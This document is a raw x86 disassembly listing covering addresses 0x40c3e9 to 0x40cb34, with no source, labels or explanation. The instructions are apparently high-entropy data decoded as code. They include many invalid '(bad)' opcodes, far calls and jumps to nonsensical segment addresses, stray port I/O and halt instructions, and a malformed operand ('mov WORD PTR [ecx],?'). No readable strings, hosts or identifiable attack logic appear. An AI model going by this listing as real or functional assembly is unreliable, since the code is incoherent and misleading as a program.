  40c3e9:	shl    edx,cl
  40c3eb:	cwde   
  40c3ec:	popa   
  40c3ed:	sbb    BYTE PTR [ebp+0xe5c7126],al
  40c3f3:	rcl    DWORD PTR [esi],0x5
  40c3f6:	enter  0x7c31,0x79
  40c3fa:	ret    0xddf1
  40c3fd:	leave  
  40c3fe:	mov    BYTE PTR [edx+0x54],0x3c
  40c402:	push   0x41e10417
  40c407:	push   cs
  40c408:	xchg   BYTE PTR [eax],dl
  40c40a:	sbb    eax,DWORD PTR [eax]
  40c40c:	scas   al,BYTE PTR es:[edi]
  40c40d:	data16 fnstcw WORD PTR [edi]
  40c410:	test   esi,esi
  40c412:	sub    al,BYTE PTR [ebx-0x10311196]
  40c418:	std    
  40c419:	int3   
  40c41a:	push   edi
  40c41b:	out    dx,eax
  40c41c:	(bad)  
  40c41d:	ret    0x72df
  40c420:	ret    
  40c421:	test   BYTE PTR ds:0x2ce0e0d2,dl
  40c427:	loop   0x40c3d1
  40c429:	ja     0x40c4a0
  40c42b:	dec    edi
  40c42c:	adc    bh,BYTE PTR [ecx+0x9]
  40c42f:	inc    ebx
  40c430:	cmp    BYTE PTR [esi+esi*4+0x71],cl
  40c434:	cmc    
  40c435:	jno    0x40c3cb
  40c437:	mov    WORD PTR [esi-0x44],ds
  40c43a:	push   edi
  40c43b:	adc    BYTE PTR [esp+esi*4-0x4652afec],ah
  40c442:	es jmp 0xcdadd086
  40c448:	mov    cl,0x50
  40c44a:	adc    ebx,DWORD PTR [eax]
  40c44c:	jp     0x40c416
  40c44e:	je     0x40c4b7
  40c450:	xor    BYTE PTR [ebp-0x1c],dh
  40c453:	and    DWORD PTR [edi+0x74],0x68df6aef
  40c45a:	sbb    al,0x71
  40c45c:	cmc    
  40c45d:	push   edx
  40c45e:	push   edx
  40c45f:	sahf   
  40c460:	lods   al,BYTE PTR ds:[esi]
  40c461:	aas    
  40c462:	rcr    DWORD PTR [edx-0x2c],1
  40c465:	(bad)
  40c468:	pop    esi
  40c469:	mov    ds:0x42e5bb0,eax
  40c46e:	cs dec ecx
  40c470:	push   eax
  40c471:	stos   DWORD PTR es:[edi],eax
  40c472:	mov    WORD PTR [ebp-0x31],ds
  40c475:	call   0xf6bd:0xcaf42a32
  40c47c:	jns    0x40c4a0
  40c47e:	or     eax,0xb40f25d3
  40c483:	dec    esp
  40c484:	xor    ah,BYTE PTR [edx-0x2]
  40c487:	pop    ebx
  40c488:	(bad)  
  40c489:	fsubr  DWORD PTR [ecx]
  40c48b:	in     al,dx
  40c48c:	sbb    eax,0xf15ff0c0
  40c491:	repnz cmp BYTE PTR [ebx-0x61],dh
  40c495:	jg     0x40c419
  40c497:	cmp    cl,dh
  40c499:	adc    ecx,DWORD PTR [esp+ebp*8]
  40c49c:	sub    BYTE PTR [ebp-0x660bc5a5],bl
  40c4a2:	les    ecx,FWORD PTR ds:0xbc0cb90d
  40c4a8:	and    al,ah
  40c4aa:	cmp    ch,BYTE PTR [ebx+0x47f54bfb]
  40c4b0:	mov    ss,WORD PTR [esi]
  40c4b2:	push   ss
  40c4b3:	push   esp
  40c4b4:	push   esp
  40c4b5:	das    
  40c4b6:	mov    eax,ds:0xaac98716
  40c4bb:	sbb    ecx,DWORD PTR [ebx+0x76]
  40c4be:	(bad)  
  40c4bf:	jmp    0x40c4a4
  40c4c1:	hlt    
  40c4c2:	xchg   edi,eax
  40c4c3:	pop    ecx
  40c4c4:	popf   
  40c4c5:	aas    
  40c4c6:	add    dh,dl
  40c4c8:	mov    eax,0x58e40084
  40c4cd:	cmp    BYTE PTR [edx+0x682845ce],0x48
  40c4d4:	inc    eax
  40c4d5:	mov    esi,0xdf989bbd
  40c4da:	data16 shr BYTE PTR [ecx+0x79],0x8b
  40c4df:	inc    esi
  40c4e0:	pop    ds
  40c4e1:	jmp    0xca75911b
  40c4e6:	aas    
  40c4e7:	mov    ah,0xd5
  40c4e9:	aas    
  40c4ea:	sbb    BYTE PTR [esi+eax*1],0xef
  40c4ee:	stos   DWORD PTR es:[edi],eax
  40c4ef:	nop
  40c4f0:	jle    0x40c4a3
  40c4f2:	cwde   
  40c4f3:	sar    BYTE PTR [ebx],0x21
  40c4f6:	in     al,0xdd
  40c4f8:	cmp    ebp,esi
  40c4fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4fb:	inc    ebx
  40c4fc:	pop    edx
  40c4fd:	std    
  40c4fe:	scas   al,BYTE PTR es:[edi]
  40c4ff:	dec    esi
  40c500:	mov    ds:0x7a561042,al
  40c505:	xor    BYTE PTR [esi+0x3d],cl
  40c508:	fucomp st(6)
  40c50a:	mov    eax,0xd241d558
  40c50f:	imul   ebp,DWORD PTR [eax],0x15
  40c512:	ret    
  40c513:	cmc    
  40c514:	sbb    edx,DWORD PTR [ebp+esi*1-0xfcaec87]
  40c51b:	dec    edi
  40c51c:	(bad)  
  40c51d:	mov    ebx,0x8348bbd5
  40c522:	lds    eax,FWORD PTR [esi]
  40c524:	inc    ecx
  40c525:	and    eax,0xb0870768
  40c52a:	cmovge edi,DWORD PTR [ebx+ebp*4]
  40c52e:	dec    eax
  40c52f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c530:	sbb    ch,BYTE PTR [ecx+0x5d56c206]
  40c536:	or     bh,dl
  40c538:	ds gs pop ss
  40c53b:	inc    esi
  40c53d:	setbe  BYTE PTR [eax]
  40c540:	fwait
  40c541:	retf   
  40c542:	mov    BYTE PTR [eax],ah
  40c544:	sub    edx,DWORD PTR [esi+0x4de97bf8]
  40c54a:	call   0xf0db:0x29809bc1
  40c551:	sub    edx,esi
  40c553:	int    0x76
  40c555:	sar    ebp,1
  40c557:	sbb    esp,DWORD PTR [ebp+0x23]
  40c55a:	imul   ebx,DWORD PTR [ebp+0x24a3dc91],0x2b93802a
  40c564:	dec    eax
  40c565:	adc    al,0x15
  40c567:	aam    0xa2
  40c569:	jecxz  0x40c58e
  40c56b:	es out 0xe8,al
  40c56e:	jae    0x40c5ee
  40c570:	(bad)  
  40c571:	out    0x53,eax
  40c573:	call   0xf572:0x48a8c985
  40c57a:	cld    
  40c57b:	je     0x40c51e
  40c57d:	out    0xd,al
  40c57f:	and    al,0xed
  40c581:	jno    0x40c564
  40c583:	test   al,0x6c
  40c585:	out    dx,al
  40c586:	rol    DWORD PTR [ebx],0x25
  40c589:	lea    ecx,[esi+0x5a]
  40c58c:	and    eax,0xbd717b4c
  40c591:	sti    
  40c592:	dec    edi
  40c593:	inc    edx
  40c594:	fidivr WORD PTR [edx-0x563ced40]
  40c59a:	mov    DWORD PTR [eax],edx
  40c59c:	popa   
  40c59d:	sbb    eax,esi
  40c59f:	sar    BYTE PTR [esi-0x337c8920],cl
  40c5a5:	and    DWORD PTR [ecx+0x38f98ae9],0x49
  40c5ac:	sub    esp,0xffffff97
  40c5af:	loop   0x40c5fe
  40c5b1:	lahf   
  40c5b2:	adc    BYTE PTR [esi+esi*1],0x38
  40c5b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5b8:	dec    ebp
  40c5b9:	jl     0x40c5ad
  40c5bb:	pop    edx
  40c5bc:	sub    bl,al
  40c5be:	scas   eax,DWORD PTR es:[edi]
  40c5bf:	shl    DWORD PTR [ebx-0x25203209],0xe7
  40c5c6:	xchg   esi,eax
  40c5c7:	cmp    ah,ah
  40c5c9:	ret    
  40c5ca:	sub    edi,DWORD PTR ds:0x7b9fce70
  40c5d0:	xchg   edi,eax
  40c5d1:	stc    
  40c5d2:	jb     0x40c649
  40c5d4:	clc    
  40c5d5:	push   edi
  40c5d6:	push   esp
  40c5d7:	ins    BYTE PTR es:[edi],dx
  40c5d8:	cdq    
  40c5d9:	scas   al,BYTE PTR es:[edi]
  40c5da:	add    esi,0x94a43023
  40c5e0:	repz dec edi
  40c5e2:	xchg   esp,eax
  40c5e3:	or     al,0xf1
  40c5e5:	outs   dx,BYTE PTR ds:[esi]
  40c5e6:	ds hlt 
  40c5e8:	or     al,ch
  40c5ea:	lods   al,BYTE PTR ds:[esi]
  40c5eb:	sbb    esi,ecx
  40c5ed:	pushf  
  40c5ee:	fadd   QWORD PTR [ecx-0x7]
  40c5f1:	mov    eax,ds:0x2988dd96
  40c5f6:	pushf  
  40c5f7:	xor    al,0x6a
  40c5f9:	pop    eax
  40c5fa:	sbb    eax,0x92119dc4
  40c5ff:	cmp    eax,ebp
  40c601:	or     eax,0xd01786ef
  40c606:	rcr    DWORD PTR [esi+0xc88d10f],cl
  40c60c:	cld    
  40c60d:	out    dx,eax
  40c60e:	mov    BYTE PTR [eax+0x6d],cl
  40c611:	jge    0x40c667
  40c613:	and    edx,ebp
  40c615:	adc    DWORD PTR [eax-0x6415ebb6],0x1ef977f0
  40c61f:	out    0x30,eax
  40c621:	cmp    BYTE PTR [edi+edi*1+0x2f],bl
  40c625:	xor    eax,0x6c7ce3e4
  40c62a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c62b:	fadd   QWORD PTR [ecx+0x5cd11b93]
  40c631:	loop   0x40c643
  40c633:	dec    edx
  40c634:	cmp    eax,0x8ce0d511
  40c639:	xchg   edi,eax
  40c63a:	jns    0x40c67d
  40c63c:	sub    edx,DWORD PTR [esi+0x7b]
  40c63f:	daa    
  40c640:	mov    ebx,0x528af127
  40c645:	cmp    eax,0x8de7e6f0
  40c64a:	and    ch,BYTE PTR [ebp-0x5b]
  40c64d:	mov    dh,0xb5
  40c64f:	dec    esp
  40c650:	pop    edi
  40c651:	stc    
  40c652:	dec    ecx
  40c653:	outs   dx,BYTE PTR ds:[esi]
  40c654:	mov    bl,0xf
  40c656:	ret    
  40c657:	sbb    eax,0x748dc1ad
  40c65c:	cmp    DWORD PTR [eax],esp
  40c65e:	or     DWORD PTR [edi+0x42],0x77545e62
  40c665:	clc    
  40c666:	push   ebx
  40c667:	loop   0x40c601
  40c669:	sub    al,0x63
  40c66b:	lahf   
  40c66c:	out    0xab,al
  40c66e:	mov    dl,0x6f
  40c670:	ja     0x40c61e
  40c672:	dec    esi
  40c673:	nop
  40c674:	stos   BYTE PTR es:[edi],al
  40c675:	inc    esi
  40c676:	push   cs
  40c677:	jne    0x40c6a0
  40c679:	call   0x76d1:0xd04285a8
  40c680:	ins    BYTE PTR es:[edi],dx
  40c681:	add    ebp,0x71
  40c684:	lea    eax,[edi-0x7f65e840]
  40c68a:	lock xor ebx,DWORD PTR [edi+0x7e4f1941]
  40c691:	fimul  WORD PTR [esi-0x49b389d8]
  40c697:	mov    bl,0x16
  40c699:	(bad)  
  40c69b:	pop    ds
  40c69c:	clc    
  40c69d:	into   
  40c69e:	jne    0x40c649
  40c6a0:	ins    BYTE PTR es:[edi],dx
  40c6a1:	cmp    BYTE PTR [esi-0x49],al
  40c6a4:	jbe    0x40c6e6
  40c6a6:	inc    esi
  40c6a7:	fdiv   DWORD PTR [ebp-0x18]
  40c6aa:	cld    
  40c6ab:	dec    ebx
  40c6ac:	mov    WORD PTR [ecx],?
  40c6ae:	sahf   
  40c6af:	leave  
  40c6b0:	add    eax,0xdd80984b
  40c6b5:	jmp    0xd34201fa
  40c6ba:	mov    esp,0xb327f08a
  40c6bf:	inc    edx
  40c6c0:	jle    0x40c73d
  40c6c2:	aam    0xeb
  40c6c4:	push   0x6
  40c6c6:	add    DWORD PTR [edi],ebx
  40c6c8:	test   eax,0x7fff5095
  40c6cd:	and    bl,BYTE PTR [esi+ecx*4+0x7c182e84]
  40c6d4:	sbb    DWORD PTR [edi+0x229e1cf0],esp
  40c6da:	(bad)  
  40c6db:	jecxz  0x40c6ef
  40c6dd:	(bad)  
  40c6e0:	pop    edi
  40c6e1:	push   es
  40c6e2:	hlt    
  40c6e3:	mov    es,edx
  40c6e5:	adc    al,0x9
  40c6e7:	int3   
  40c6e8:	mov    BYTE PTR [ecx+0x12],bl
  40c6eb:	pop    ss
  40c6ec:	js     0x40c679
  40c6ee:	int3   
  40c6ef:	jns    0x40c763
  40c6f1:	mov    dl,0x67
  40c6f3:	ret    0xf8f9
  40c6f6:	mov    ecx,0x9dce2e04
  40c6fb:	stc    
  40c6fc:	neg    BYTE PTR [ecx-0x3e01d9fc]
  40c702:	fucomip st,st(3)
  40c704:	dec    ebx
  40c705:	fwait
  40c706:	cmp    esp,DWORD PTR ds:[esi+0xf10ca03]
  40c70d:	xor    ah,BYTE PTR [ecx-0x2d]
  40c710:	add    DWORD PTR [ebp+0xc],eax
  40c713:	repnz mov esp,0x1a0528ec
  40c719:	mov    DWORD PTR [edi+ebp*2],edx
  40c71c:	jo     0x40c756
  40c71e:	mov    BYTE PTR [ecx+0x33bfb1a9],dh
  40c724:	enter  0xd873,0xad
  40c728:	dec    edi
  40c729:	stos   BYTE PTR es:[edi],al
  40c72a:	inc    ecx
  40c72b:	jle    0x40c786
  40c72d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c72e:	popf   
  40c72f:	leave  
  40c730:	jns    0x40c6c3
  40c732:	xor    BYTE PTR [eax+0x1cd1e934],bl
  40c738:	(bad)  
  40c739:	ja     0x40c726
  40c73b:	lock pop ss
  40c73d:	in     al,dx
  40c73e:	call   0x9b73dacf
  40c743:	push   0xffffffd4
  40c745:	pop    es
  40c746:	cli    
  40c747:	dec    esp
  40c748:	cld    
  40c749:	cmp    DWORD PTR [edx+0x45],eax
  40c74c:	and    DWORD PTR [edx],esp
  40c74e:	fcmovu st,st(7)
  40c750:	lods   al,BYTE PTR ds:[esi]
  40c751:	daa    
  40c752:	jmp    0x6d67:0xf7895ffa
  40c759:	daa    
  40c75a:	adc    esp,DWORD PTR [esi+0x2249d88a]
  40c760:	pop    ebx
  40c761:	arpl   WORD PTR [ebx-0x68d3cd11],bx
  40c767:	sub    ah,ch
  40c769:	cmp    cl,ch
  40c76b:	enter  0xc0b3,0x52
  40c76f:	sar    BYTE PTR [ebp-0x5659cf03],0x31
  40c776:	int    0x4a
  40c778:	les    ebp,FWORD PTR [ebx+0x4f1cf150]
  40c77e:	rcl    BYTE PTR [esi],0xdf
  40c781:	and    al,0x8e
  40c783:	push   edx
  40c784:	jae    0x40c755
  40c786:	jp     0x40c764
  40c788:	call   0xcc504ece
  40c78d:	repz out dx,al
  40c78f:	ficom  WORD PTR [esi]
  40c791:	aas    
  40c792:	ret    
  40c793:	(bad)  
  40c794:	sbb    eax,ecx
  40c796:	hlt    
  40c797:	lahf   
  40c798:	pop    ecx
  40c799:	jo     0x40c78c
  40c79b:	mov    esp,0xc4f2fae5
  40c7a0:	shl    BYTE PTR [ebp+0x75],cl
  40c7a3:	daa    
  40c7a4:	call   0xe585d0a3
  40c7a9:	ret    
  40c7aa:	fld    TBYTE PTR [eax-0x3459f037]
  40c7b0:	ret    
  40c7b1:	push   edi
  40c7b2:	jmp    0x40c7fd
  40c7b4:	clc    
  40c7b5:	sahf   
  40c7b6:	das    
  40c7b7:	rcr    BYTE PTR [edx-0x3a429ec8],1
  40c7bd:	push   edx
  40c7be:	mov    ecx,0x26fb2c58
  40c7c3:	enter  0x4ec7,0x3b
  40c7c7:	mov    BYTE PTR [edi],ch
  40c7c9:	(bad)  
  40c7ca:	pop    edi
  40c7cb:	xchg   edi,eax
  40c7cc:	fiadd  WORD PTR [edx-0x36]
  40c7cf:	push   esi
  40c7d0:	inc    eax
  40c7d1:	stos   DWORD PTR es:[edi],eax
  40c7d2:	sub    cl,ah
  40c7d4:	and    esi,DWORD PTR [edi]
  40c7d6:	adc    al,0xf4
  40c7d8:	or     ebp,DWORD PTR [eax]
  40c7da:	sub    DWORD PTR [edx],edi
  40c7dc:	pushf  
  40c7dd:	in     al,0xa4
  40c7df:	jnp    0x40c854
  40c7e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7e2:	jnp    0x40c83d
  40c7e4:	int    0xd2
  40c7e6:	jmp    0xda6863f5
  40c7eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7ec:	mov    ch,0x26
  40c7ee:	mov    ah,0x40
  40c7f0:	pusha  
  40c7f1:	and    ebx,DWORD PTR [ebp+0x5f]
  40c7f4:	xor    esp,DWORD PTR [ebx-0x23]
  40c7f7:	int    0x61
  40c7f9:	ja     0x40c879
  40c7fb:	rcl    BYTE PTR [edx+0x58ed70ce],0x81
  40c802:	fwait
  40c803:	lea    edi,[esi]
  40c805:	adc    bh,BYTE PTR [edi+0x59]
  40c808:	add    al,0x47
  40c80a:	ror    BYTE PTR [edi],0xea
  40c80d:	lods   eax,DWORD PTR ds:[esi]
  40c80e:	out    0xd7,eax
  40c810:	add    ebx,ecx
  40c812:	jge    0x40c876
  40c814:	in     eax,0x9e
  40c816:	pop    ds
  40c817:	mov    esp,DWORD PTR [edx-0x1f]
  40c81a:	push   0xffffffca
  40c81c:	adc    ebp,DWORD PTR [ebx+0x52807327]
  40c822:	push   edx
  40c823:	hlt    
  40c824:	and    dh,BYTE PTR [eax+0x0]
  40c827:	pop    ecx
  40c828:	or     al,0x6e
  40c82a:	pop    esp
  40c82b:	lahf   
  40c82c:	jecxz  0x40c7d3
  40c82e:	ss pop eax
  40c830:	shl    DWORD PTR [esi+0x4d],1
  40c833:	(bad)  
  40c834:	sbb    DWORD PTR [esi-0x30],ebx
  40c837:	mov    dl,0x45
  40c839:	daa    
  40c83a:	lea    ecx,[edi-0x416df10c]
  40c840:	fsubp  st(5),st
  40c842:	(bad)  
  40c843:	cmp    ebp,DWORD PTR [ebp+0x7e68db02]
  40c849:	mov    DWORD PTR [ecx-0x235e9cbb],ebx
  40c84f:	sub    al,0xe3
  40c851:	xchg   edi,eax
  40c852:	into   
  40c853:	xchg   edi,eax
  40c854:	in     al,dx
  40c855:	fdiv   st,st(7)
  40c857:	(bad)  
  40c859:	lock xchg edi,eax
  40c85b:	xor    eax,0x57f5bf67
  40c860:	stos   DWORD PTR es:[edi],eax
  40c861:	push   0xffffff90
  40c863:	sbb    al,0x79
  40c865:	(bad)  
  40c866:	(bad)  
  40c867:	cld    
  40c868:	pop    ebx
  40c869:	and    al,0x28
  40c86b:	or     eax,0xa0107aa7
  40c870:	test   DWORD PTR ds:0x4336a80c,eax
  40c876:	fcom   st(2)
  40c878:	daa    
  40c879:	and    DWORD PTR [edx-0x5d96b61b],ecx
  40c87f:	mov    esi,0xc1bceffa
  40c884:	leave  
  40c885:	pop    ebx
  40c886:	data16 xor bh,bl
  40c889:	sub    dl,bl
  40c88b:	repz and al,0x3e
  40c88e:	bound  ebp,QWORD PTR [edx+0x75]
  40c891:	std    
  40c892:	pop    esp
  40c893:	sbb    al,0x16
  40c895:	sub    cl,bh
  40c897:	daa    
  40c898:	xlat   BYTE PTR ds:[ebx]
  40c899:	mov    al,ds:0x865d7b16
  40c89e:	and    eax,0xc9040597
  40c8a3:	clc    
  40c8a4:	xor    eax,0xeddcd484
  40c8a9:	pop    esp
  40c8aa:	pop    ecx
  40c8ab:	mov    cl,ah
  40c8ad:	push   edi
  40c8ae:	ret    0x92a0
  40c8b1:	cdq    
  40c8b2:	adc    ecx,DWORD PTR [esi]
  40c8b4:	and    BYTE PTR [esi],dh
  40c8b6:	pop    esi
  40c8b7:	and    al,0xb8
  40c8b9:	xor    BYTE PTR [esi-0xa5f94e7],0x62
  40c8c0:	dec    esp
  40c8c1:	mov    DWORD PTR [ebp+0x44cfafb4],eax
  40c8c7:	into   
  40c8c8:	ins    DWORD PTR es:[edi],dx
  40c8c9:	sahf   
  40c8ca:	mov    dh,0xa9
  40c8cc:	call   0x6311df80
  40c8d1:	mov    ds:0xc84ca49a,eax
  40c8d6:	nop
  40c8d7:	int    0x56
  40c8d9:	mov    ebp,0xa050cf20
  40c8de:	ss gs jmp 0x40c924
  40c8e2:	sub    DWORD PTR [ecx+0x5b],edx
  40c8e5:	aaa    
  40c8e6:	out    dx,al
  40c8e7:	outs   dx,BYTE PTR ds:[esi]
  40c8e8:	xor    ah,cl
  40c8ea:	xor    eax,DWORD PTR [edx]
  40c8ec:	mov    dh,al
  40c8ee:	stos   BYTE PTR es:[edi],al
  40c8ef:	test   eax,0x13b5d0ad
  40c8f4:	push   edx
  40c8f5:	in     al,dx
  40c8f6:	adc    esi,0xfffffffa
  40c8f9:	jmp    0x6b92:0x8a17e89a
  40c900:	hlt    
  40c901:	and    DWORD PTR [edx],0x5cf51af3
  40c907:	popf   
  40c908:	or     al,0x9
  40c90a:	jl     0x40c8d3
  40c90c:	inc    edi
  40c90d:	scas   al,BYTE PTR es:[edi]
  40c90e:	leave  
  40c90f:	stos   BYTE PTR es:[edi],al
  40c910:	mov    dh,0xc6
  40c912:	sbb    DWORD PTR [edx+0x23],ebp
  40c915:	iret   
  40c916:	jo     0x40c8b8
  40c918:	clc    
  40c919:	jmp    0x6c3f:0xe2ec0977
  40c920:	mov    ch,0x6c
  40c922:	enter  0xb39b,0x40
  40c926:	data16 stc 
  40c928:	xor    ecx,DWORD PTR [edi+0x785213e7]
  40c92e:	xchg   BYTE PTR [eax+0x76dcbc8b],al
  40c934:	push   ebp
  40c935:	adc    DWORD PTR [edi+0x78],ebx
  40c938:	dec    esp
  40c939:	pop    eax
  40c93a:	pop    ebx
  40c93b:	ss jae 0x40c9af
  40c93e:	repnz leave 
  40c940:	mov    bh,0x77
  40c942:	xchg   DWORD PTR [ebp+0x4927fd2b],esi
  40c948:	ds xchg edx,eax
  40c94a:	mov    bh,0x25
  40c94c:	push   ebx
  40c94d:	or     DWORD PTR ds:0x1fff0e74,eax
  40c953:	mov    bl,0xe1
  40c955:	int    0xb4
  40c957:	not    esi
  40c959:	out    dx,eax
  40c95a:	aam    0x7f
  40c95c:	mov    ecx,0x87a03430
  40c961:	cs clc 
  40c963:	fld    TBYTE PTR [eax+0x32f828ff]
  40c969:	and    DWORD PTR [ecx+0xf],ebx
  40c96c:	mov    al,ds:0xd5ceec3a
  40c971:	mov    WORD PTR [ebp+0x75],ss
  40c974:	mov    eax,0x5119f2a3
  40c979:	xor    esp,DWORD PTR [ebx]
  40c97b:	jmp    0x40c985
  40c97d:	mov    eax,0xd304616f
  40c982:	lods   eax,DWORD PTR ds:[esi]
  40c983:	pop    ds
  40c984:	in     eax,0xdc
  40c986:	cmp    DWORD PTR [edx],edx
  40c988:	js     0x40c9cc
  40c98a:	sahf   
  40c98b:	cmp    dl,BYTE PTR [ebx-0x38c809a9]
  40c991:	lods   eax,DWORD PTR ds:[esi]
  40c992:	cdq    
  40c993:	repnz and dh,dh
  40c996:	pushf  
  40c997:	push   ecx
  40c998:	(bad)  
  40c999:	xchg   edi,eax
  40c99a:	test   DWORD PTR [edi-0x2a],0x336cbcd4
  40c9a1:	retf   0x1a45
  40c9a4:	popf   
  40c9a5:	push   ecx
  40c9a6:	jo     0x40c967
  40c9a8:	adc    eax,0x27b1e316
  40c9ad:	fimul  DWORD PTR [ebx+0x7876e4db]
  40c9b3:	push   esi
  40c9b4:	mov    ebp,0x4c196141
  40c9b9:	xchg   ecx,eax
  40c9ba:	rcr    BYTE PTR [ebp+0x32],cl
  40c9bd:	xlat   BYTE PTR ds:[ebx]
  40c9be:	push   edx
  40c9bf:	mov    DWORD PTR [eax+edx*8-0x7c7860b1],esi
  40c9c6:	xchg   DWORD PTR [ebx-0x44793822],eax
  40c9cc:	adc    ebp,DWORD PTR [edx]
  40c9ce:	mov    BYTE PTR [esi+0x49],al
  40c9d1:	fsub   DWORD PTR [edi]
  40c9d3:	fild   QWORD PTR [edi]
  40c9d5:	jne    0x40ca20
  40c9d7:	pop    ss
  40c9d8:	cmp    ebp,ebp
  40c9da:	pop    ecx
  40c9db:	or     al,0x8d
  40c9dd:	adc    ebx,DWORD PTR [esi]
  40c9df:	pusha  
  40c9e0:	pop    edi
  40c9e1:	add    al,ch
  40c9e3:	outs   dx,BYTE PTR ds:[esi]
  40c9e4:	sub    DWORD PTR [ebx-0x34d47c1],0xffffff85
  40c9eb:	aaa    
  40c9ec:	ror    DWORD PTR [edi],1
  40c9ee:	cld    
  40c9ef:	jae    0x40ca28
  40c9f1:	jo     0x40ca09
  40c9f3:	cdq    
  40c9f4:	push   ss
  40c9f5:	adc    BYTE PTR [ebx+eiz*4+0x44],cl
  40c9f9:	lahf   
  40c9fa:	xchg   ebx,ebx
  40c9fc:	xlat   BYTE PTR ds:[ebx]
  40c9fd:	clc    
  40c9fe:	and    al,0xa
  40ca00:	mov    bl,0x61
  40ca02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca03:	push   0x7b
  40ca05:	call   0xcaeb:0xc8b68265
  40ca0c:	rcr    BYTE PTR [eax+0x51],0xcf
  40ca10:	and    esi,DWORD PTR [edx-0x5ea165c9]
  40ca16:	pop    ecx
  40ca17:	neg    BYTE PTR ds:0x6758c4d2
  40ca1d:	fisubr WORD PTR [edi+0x34]
  40ca20:	xchg   bh,bl
  40ca22:	pop    ebx
  40ca23:	outs   dx,DWORD PTR ds:[esi]
  40ca24:	aad    0x64
  40ca26:	scas   al,BYTE PTR es:[edi]
  40ca27:	or     ebp,esp
  40ca29:	and    bl,bl
  40ca2b:	jg     0x40ca24
  40ca2d:	lahf   
  40ca2e:	iret   
  40ca2f:	cld    
  40ca30:	(bad)  
  40ca32:	xor    al,0x9a
  40ca34:	stos   DWORD PTR es:[edi],eax
  40ca35:	sbb    al,dh
  40ca37:	push   ebx
  40ca38:	fistp  WORD PTR [eax-0x12]
  40ca3b:	fild   DWORD PTR [edx-0x46]
  40ca3e:	outs   dx,BYTE PTR ds:[esi]
  40ca3f:	inc    edx
  40ca40:	cmp    DWORD PTR [esi-0x1470747b],edx
  40ca46:	arpl   WORD PTR [eax-0x4d],sp
  40ca49:	push   edx
  40ca4a:	inc    esp
  40ca4b:	popf   
  40ca4c:	push   ss
  40ca4d:	dec    ecx
  40ca4e:	dec    esp
  40ca4f:	fadd   st,st(2)
  40ca51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca52:	xor    bh,BYTE PTR [esp+eiz*2]
  40ca55:	pushf  
  40ca56:	pop    ecx
  40ca57:	or     eax,0xf08fa2e9
  40ca5c:	add    ah,al
  40ca5e:	jno    0x40cad4
  40ca60:	test   al,0x87
  40ca62:	outs   dx,BYTE PTR ds:[esi]
  40ca63:	std    
  40ca64:	mov    ecx,0xe3b2c8bb
  40ca69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca6a:	neg    BYTE PTR [edi-0x1c]
  40ca6d:	sub    eax,0x89470a9e
  40ca72:	add    edi,DWORD PTR [ecx+0x3c161714]
  40ca78:	jp     0x40caab
  40ca7a:	jge    0x40ca2f
  40ca7c:	ins    DWORD PTR es:[edi],dx
  40ca7d:	and    al,0x50
  40ca7f:	dec    edx
  40ca80:	in     al,0x17
  40ca82:	pop    edx
  40ca83:	or     dl,bl
  40ca85:	iret   
  40ca86:	cdq    
  40ca87:	hlt    
  40ca88:	and    BYTE PTR [ebp+0x4a5e9af8],ch
  40ca8e:	push   ss
  40ca8f:	pop    ebx
  40ca90:	push   ecx
  40ca91:	or     ch,BYTE PTR [esi-0x21]
  40ca94:	(bad)  
  40ca95:	loope  0x40cae9
  40ca97:	xor    al,0xe
  40ca99:	test   ax,0xe17
  40ca9d:	pop    ds
  40ca9e:	push   esp
  40ca9f:	shl    bh,0xc4
  40caa2:	jnp    0x40cac6
  40caa4:	(bad)  
  40caa5:	jmp    0x4421cdbe
  40caaa:	xor    bl,cl
  40caac:	mov    bl,0x44
  40caae:	and    al,0x12
  40cab0:	jns    0x40cae7
  40cab2:	inc    eax
  40cab3:	fs mov ch,0xf5
  40cab6:	cs mov bx,0xa985
  40cabb:	jae    0x40ca7e
  40cabd:	sub    ebx,DWORD PTR [edx]
  40cabf:	ins    BYTE PTR es:[edi],dx
  40cac0:	sar    DWORD PTR [edi-0x67],1
  40cac3:	outs   dx,DWORD PTR ds:[esi]
  40cac4:	xchg   ecx,eax
  40cac5:	xor    ebp,DWORD PTR [esi-0x25ab9017]
  40cacb:	xchg   esi,eax
  40cacc:	call   0x9e20:0x1b307f92
  40cad3:	stc    
  40cad4:	sub    esi,DWORD PTR [ebx-0x6b]
  40cad7:	xor    ecx,DWORD PTR [eax+0x57]
  40cada:	std    
  40cadb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cadc:	cmp    BYTE PTR [esi-0xcdaae89],bl
  40cae2:	mov    eax,0x258e8acf
  40cae7:	inc    esi
  40cae8:	push   DWORD PTR [esi+0x2d80fc4b]
  40caee:	call   DWORD PTR [edx+0x6887f5bc]
  40caf4:	sbb    eax,0xa15f81ef
  40caf9:	xchg   esp,eax
  40cafa:	arpl   WORD PTR [ebp+0x6c],si
  40cafd:	jl     0x40cb6c
  40caff:	lahf   
  40cb00:	xchg   esi,eax
  40cb01:	loopne 0x40cafd
  40cb03:	mov    cl,0x78
  40cb05:	retf   
  40cb06:	lods   eax,DWORD PTR ds:[esi]
  40cb07:	ret    0x941b
  40cb0a:	mov    DWORD PTR [eax],ebx
  40cb0c:	int3   
  40cb0d:	pop    edx
  40cb0e:	mov    al,ds:0x78141d1a
  40cb13:	mov    bl,0x7f
  40cb15:	icebp  
  40cb16:	jge    0x40cb66
  40cb18:	sub    DWORD PTR [ebx-0x710ea508],ebp
  40cb1e:	mov    edi,0xde61c920
  40cb23:	adc    DWORD PTR [eax-0x19],ebx
  40cb26:	mov    bh,0x90
  40cb28:	push   ebp
  40cb29:	test   BYTE PTR [edx],cl
  40cb2b:	jle    0x40cb78
  40cb2d:	int3   
  40cb2e:	(bad)  
  40cb2f:	fistp  DWORD PTR [eax+ebx*2]
  40cb32:	jb     0x40cb21
  40cb34:	cdq    
